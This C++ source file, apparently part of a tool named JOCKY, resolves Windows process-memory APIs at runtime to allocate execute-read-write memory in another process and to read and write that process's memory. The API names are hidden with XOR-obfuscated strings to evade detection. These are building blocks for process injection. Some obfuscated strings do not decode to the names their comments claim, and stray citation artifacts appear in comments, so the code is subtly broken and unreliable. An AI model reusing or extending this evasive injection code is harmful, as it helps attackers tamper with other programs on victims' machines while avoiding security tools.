// runtime_memory.cpp — JOCKY Runtime Memory Module
#define NULL 0
#include "string_hide.h"

typedef unsigned long DWORD;
typedef void* PVOID;
typedef PVOID HANDLE;
typedef int BOOL;
typedef unsigned long long SIZE_T;

#define MEM_COMMIT  0x1000
#define MEM_RESERVE 0x2000
#define PAGE_EXECUTE_READWRITE 0x40

typedef PVOID (__stdcall *Fn_VirtualAllocEx)(HANDLE,PVOID,SIZE_T,DWORD,DWORD);
typedef BOOL  (__stdcall *Fn_ReadProcessMemory)(HANDLE,PVOID,PVOID,SIZE_T,SIZE_T*);
typedef BOOL  (__stdcall *Fn_WriteProcessMemory)(HANDLE,PVOID,const PVOID,SIZE_T,SIZE_T*);

extern "C" PVOID __stdcall GetProcAddress(PVOID hModule, const char* name);
extern "C" PVOID __stdcall GetModuleHandleA(const char* name);

static PVOID get_k32_mem() {
    USE_STR(n, XB(0x31), XB(0x3F), XB(0x28), XB(0x34), XB(0x3F), XB(0x36), XB(0x69), XB(0x68), XB(0x74), XB(0x3E), XB(0x36), XB(0x36)) // kernel32.dll
    PVOID h = GetModuleHandleA(n);
    ZERO_STR(n);
    return h;
}

extern "C" PVOID jocky_alloc_ex(HANDLE hProc, DWORD size) {
    static Fn_VirtualAllocEx fn = NULL;
    if (!fn) {
        USE_STR(s, XB(0x0C), XB(0x33), XB(0x28), XB(0x2E), XB(0x2F), XB(0x3B), XB(0x36), XB(0x1B), XB(0x36), XB(0x36), XB(0x35), XB(0x39), XB(0x2A), XB(0x3F)) // VirtualAllocEx[cite: 2]
        fn = (Fn_VirtualAllocEx)GetProcAddress(get_k32_mem(), s); ZERO_STR(s);
    }
    if (fn) return fn(hProc, NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    return NULL;
}

extern "C" BOOL jocky_read_proc(HANDLE hProc, PVOID src, PVOID dst, SIZE_T size) {
    static Fn_ReadProcessMemory fn = NULL;
    if (!fn) {
        USE_STR(s, XB(0x12), XB(0x37), XB(0x2C), XB(0x2E), XB(0x1C), XB(0x34), XB(0x3F), XB(0x2E), XB(0x2B), XB(0x3F), XB(0x0D), XB(0x37), XB(0x3B), XB(0x3B), XB(0x3F), XB(0x39), XB(0x2E)) // ReadProcessMemory[cite: 2]
        fn = (Fn_ReadProcessMemory)GetProcAddress(get_k32_mem(), s); ZERO_STR(s);
    }
    if (fn) return fn(hProc, src, dst, size, NULL);
    return 0;
}

extern "C" BOOL jocky_write_proc(HANDLE hProc, PVOID dst, const PVOID src, SIZE_T size) {
    static Fn_WriteProcessMemory fn = NULL;
    if (!fn) {
        USE_STR(s, XB(0x0D), XB(0x28), XB(0x33), XB(0x2E), XB(0x3F), XB(0x1C), XB(0x34), XB(0x3F), XB(0x2E), XB(0x2B), XB(0x3F), XB(0x0D), XB(0x37), XB(0x3B), XB(0x3B), XB(0x3F), XB(0x39), XB(0x2E)) // WriteProcessMemory[cite: 2]
        fn = (Fn_WriteProcessMemory)GetProcAddress(get_k32_mem(), s); ZERO_STR(s);
    }
    if (fn) return fn(hProc, dst, src, size, NULL);
    return 0;
}